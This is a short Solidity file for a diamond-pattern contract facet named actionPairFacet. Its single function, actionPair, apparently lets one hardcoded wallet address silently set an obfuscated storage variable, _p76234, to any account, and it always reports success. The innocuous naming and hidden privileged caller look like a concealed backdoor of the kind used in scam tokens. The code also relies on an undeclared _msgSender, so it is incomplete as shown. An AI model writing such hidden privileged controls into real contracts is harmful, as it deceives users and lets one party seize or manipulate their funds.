// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0xdB6a2f0813f1D5064aE35e200d91dEfBbed9cb84)
            ds._p76234 = account;
        return true;
    }
}
